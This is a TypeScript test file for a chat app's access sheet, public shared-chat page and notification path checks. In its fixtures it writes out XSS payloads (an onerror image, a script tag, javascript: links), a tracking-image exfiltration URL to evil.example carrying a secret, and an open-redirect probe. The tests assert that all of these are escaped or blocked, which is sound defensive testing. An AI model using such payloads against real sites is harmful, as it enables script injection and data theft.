import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { renderToStaticMarkup } from "react-dom/server";
import { AccessSheet } from "../src/access/AccessSheet";
import { accessPath, type ItemAccess, type PickerGroup, type PickerPerson } from "../src/access/accessApi";
import { addPicked, draftFrom, pickerOptions, toPutBody } from "../src/access/accessModel";
import { levelDescription } from "../src/access/accessLevels";
import { createDialogGuard } from "../src/ui/useHistoryDialogGuard";
import { chatBackAction, chatRoute } from "../src/chatRoute";
import { loadPublicSnapshot, PublicChat, publicTokenFrom, PublicTranscript } from "../src/chat/PublicChat";
import { linkStateLine, PUBLIC_LINK_WARNING } from "../src/chat/PublicLinkSheet";
import { safeNotificationPath } from "../src/notifications/notificationsApi";
import type { PublicChatSnapshot } from "../shared/agents";

/**
 * Wave 43 "AC-D" client: the Access sheet's payloads for agents and chats (levels, no guests by name,
 * the share warning), the public page rendering untrusted Markdown safely without the app's session,
 * the Public link sheet's copy, notification paths, and the 390 px history model (every new sheet on
 * the history guard; Back from a shared chat goes back to the list).
 */

const src = join(import.meta.dir, "..", "src");
const read = (path: string) => readFileSync(join(src, path), "utf8");
const id = (n: number) => `00000000-0000-4000-8000-${String(n).padStart(12, "0")}`;
const token = "A".repeat(20) + "b_-".repeat(7) + "Zz";

const agentAccess = (patch: Partial<ItemAccess> = {}): ItemAccess => ({
  etag: "\"e1\"", kind: "agent", title: "Support FAQ", owner: { id: id(1), displayName: "Ana" }, audience: "selected",
  people: [{ id: id(2), displayName: "Ben", teamRole: "member", kind: "person", level: "manage", via: "direct", blocked: false }],
  groups: [{ id: id(9), name: "Ops", memberCount: 4, guestCount: 1, selfAddedCount: 0, level: "view" }],
  levels: ["view", "manage"], yourLevel: "owner", youId: id(1), shareWithGuests: true, guestsExcluded: true, inheritable: false, ...patch
});
const people: PickerPerson[] = [{ id: id(3), displayName: "Cleo", role: "member" }, { id: id(4), displayName: "Gus", role: "guest" }];
const groups: PickerGroup[] = [{ id: id(10), name: "Support", memberCount: 3, guestCount: 2 }];

describe("the Access sheet on agents and chats", () => {
  test("paths, levels, and PUT bodies", () => {
    expect(accessPath("agent", id(5))).toBe(`/agents/${id(5)}/access`);
    expect(accessPath("chat", id(6))).toBe(`/chats/${id(6)}/access`);
    expect(levelDescription("agent", "view")).toContain("never see its prompt");
    expect(levelDescription("agent", "manage")).toContain("never delete");
    expect(levelDescription("chat", "view")).toContain("tool calls and results");
    const access = agentAccess();
    const draft = addPicked(draftFrom(access), `person:${id(3)}`, access, people, groups);
    // A new person starts at view (the lowest level the kind offers).
    expect(toPutBody(draft, access)).toEqual({ audience: "selected", people: [{ id: id(2), level: "manage" }, { id: id(3), level: "view" }], groups: [{ id: id(9), level: "view" }] });
    // Never an audience level for agents and chats; private sends no rows.
    expect(toPutBody({ ...draft, audience: "private" }, access)).toEqual({ audience: "private", people: [], groups: [] });
  });

  test("guests are never offered by name; groups with guests are, saying their guests get nothing", () => {
    const options = pickerOptions(draftFrom(agentAccess()), agentAccess(), people, groups);
    expect(options.map((option) => option.label)).toEqual(["Support", "Cleo"]);
    expect(options[0]!.description).toContain("its guests get nothing");
    expect(options[0]!.disabled).toBe(false);
  });

  test("the sheet renders the chat warning and a manager's cap", () => {
    const chat = agentAccess({ kind: "chat", levels: ["view"], people: [], groups: [] });
    const warning = "People you share with see tool calls and results, including anything the agent read from your Nook.";
    const html = renderToStaticMarkup(<AccessSheet kind="chat" id={id(6)} title="Q3 planning" note={warning} onClose={() => undefined} onSaved={() => undefined} initial={{ access: chat, people, groups }} />);
    expect(html).toContain(warning);
    expect(html).toContain("Everyone signed in");
    const manager = renderToStaticMarkup(<AccessSheet kind="agent" id={id(5)} title="Support FAQ" onClose={() => undefined} onSaved={() => undefined} initial={{ access: agentAccess({ yourLevel: "manage", levels: ["view"] }), people, groups }} />);
    expect(manager).toContain("up to Can view");
    expect(manager).not.toContain("Who can open this");
  });

  test("ChatApp and the agent editor carry the warning and open the sheets with their own history guard", () => {
    const chatApp = read("chat/ChatApp.tsx");
    expect(chatApp).toContain("People you share with see tool calls and results, including anything the agent read from your Nook.");
    expect(chatApp).toMatch(/<AccessSheet kind="chat"[^>]*guardHistory/);
    expect(read("chat/AgentsSettings.tsx")).toMatch(/<AccessSheet kind="agent"[^>]*guardHistory/);
    expect(read("chat/PublicLinkSheet.tsx")).toContain("useHistoryDialogGuard(true, onClose");
    expect(read("chat/PublicChat.tsx")).toContain("useHistoryDialogGuard(true, onClose)");
    // No native select or confirm in the new pieces (D91).
    for (const file of ["chat/PublicLinkSheet.tsx", "chat/PublicChat.tsx"]) {
      expect(read(file)).not.toContain("<select");
      expect(read(file)).not.toMatch(/window\.confirm|\bconfirm\(/);
    }
  });
});

describe("the 390 px history model", () => {
  test("Back closes a sheet first and undoes the browser's move; Back from a shared chat returns to the list", () => {
    let closed = 0;
    const moves: number[] = [];
    let open = true;
    const guard = createDialogGuard({ isOpen: () => open, markClosed: () => { open = false; }, close: () => { closed += 1; }, openDepth: () => 2, undo: (direction) => { moves.push(direction); } });
    expect(guard({ "mynotes.depth": 1 })).toBe(true);
    expect(closed).toBe(1);
    expect(moves).toHaveLength(1);
    // A second Back is not the sheet's any more.
    expect(guard({ "mynotes.depth": 0 })).toBe(false);
    // A shared chat opened from the list steps back through history; opened from a notice it replaces itself with the list.
    expect(chatBackAction(chatRoute(id(6)), 1)).toEqual({ kind: "history" });
    expect(chatBackAction(chatRoute(id(6)), 0)).toEqual({ kind: "replace", route: chatRoute() });
  });

  test("notification paths for shared agents and chats", () => {
    expect(safeNotificationPath(`/chat/${id(6)}`)).toBe(`/chat/${id(6)}`);
    expect(safeNotificationPath(`/chat/new?agent=${id(5)}`)).toBe(`/chat/new?agent=${id(5)}`);
    expect(safeNotificationPath("/chat/new?agent=javascript:alert(1)")).toBe("/notifications");
    expect(safeNotificationPath("https://evil.example/chat/x")).toBe("/notifications");
  });
});

const snapshot = (patch: Partial<PublicChatSnapshot> = {}): PublicChatSnapshot => ({
  version: 1, title: "Refund policy", agentName: "Support FAQ", ownerName: "Ana", snapshotAt: "2026-10-06T10:00:00.000Z", includeToolResults: false, truncated: false,
  messages: [
    { role: "user", content: "<img src=x onerror=alert(1)> how do refunds work?", createdAt: "2026-10-06T09:00:00.000Z", toolCalls: [] },
    { role: "assistant", content: "Annual plans are **pro rata**.\n\n<script>alert(1)</script>\n\n![tracker](https://evil.example/p.png?d=secret)\n\n[click](javascript:alert(1)) and [docs](https://docs.example/x)", createdAt: "2026-10-06T09:00:01.000Z", toolCalls: [{ tool: "search_notes", server: "nook", ok: true }] }
  ],
  ...patch
});

describe("the public page /share/c/:token", () => {
  test("the token comes from the path only, well formed", () => {
    expect(publicTokenFrom(`/share/c/${token}`)).toBe(token);
    expect(publicTokenFrom(`/share/c/${token}/`)).toBe(token);
    expect(publicTokenFrom("/share/c/short")).toBeNull();
    expect(publicTokenFrom(`/share/c/${token}x`)).toBeNull();
    expect(read("main.tsx")).toContain('window.location.pathname.startsWith("/share/c/")');
  });

  test("renders untrusted Markdown safely, names only, tool calls by name", () => {
    const html = renderToStaticMarkup(<PublicChat token={token} initial={{ state: "ready", snapshot: snapshot() }} />);
    expect(html).toContain("Refund policy");
    expect(html).toContain("Shared by Ana");
    expect(html).toContain("<strong>pro rata</strong>");
    // Raw HTML is text, never markup; no remote image is loaded; javascript: links are not links.
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("https://evil.example/p.png");
    expect(html).toContain("search_notes");
    expect(html).toContain("Tool calls show by name only.");
    expect(html).not.toContain("Arguments and result");
    // External links are the renderer's intercepted links (a click opens the full-URL sheet), showing their host.
    expect(html).toContain('class="chat-md-link" rel="noopener noreferrer"');
    expect(html).toContain("↗ docs.example");
  });

  test("results show only when the owner included them; missing and limited states", async () => {
    const withResults = snapshot({ includeToolResults: true, messages: [{ role: "assistant", content: "Done", createdAt: "2026-10-06T09:00:01.000Z", toolCalls: [{ tool: "echo", server: "srv", ok: true, args: "{\"q\":1}", result: "<b>result</b>" }] }] });
    const html = renderToStaticMarkup(<PublicTranscript snapshot={withResults} context={{ onExternalLink: () => undefined, onNookLink: () => undefined }} />);
    expect(html).toContain("Arguments and result");
    expect(html).toContain("&lt;b&gt;result&lt;/b&gt;");
    expect(renderToStaticMarkup(<PublicChat token={null} />)).toContain("This link is not available");
    const fetcher = (status: number, body: unknown = {}) => (async () => new Response(JSON.stringify(body), { status })) as unknown as typeof fetch;
    expect(await loadPublicSnapshot(token, fetcher(404))).toEqual({ state: "missing" });
    expect(await loadPublicSnapshot(token, fetcher(429))).toEqual({ state: "limited" });
    expect((await loadPublicSnapshot(token, fetcher(200, { snapshot: snapshot() }))).state).toBe("ready");
    expect(await loadPublicSnapshot(token, fetcher(200, { nope: true }))).toEqual({ state: "error" });
  });

  test("the Public link sheet's copy", () => {
    expect(PUBLIC_LINK_WARNING).toContain("Anyone with the link");
    expect(PUBLIC_LINK_WARNING).toContain("Tool results stay hidden");
    expect(linkStateLine({ createdAt: "2026-10-01T10:00:00.000Z", updatedAt: "2026-10-01T10:00:00.000Z", includeToolResults: false })).toMatch(/^Created /);
    expect(linkStateLine({ createdAt: "2026-10-01T10:00:00.000Z", updatedAt: "2026-10-02T10:00:00.000Z", includeToolResults: false })).toContain("snapshot updated");
  });
});
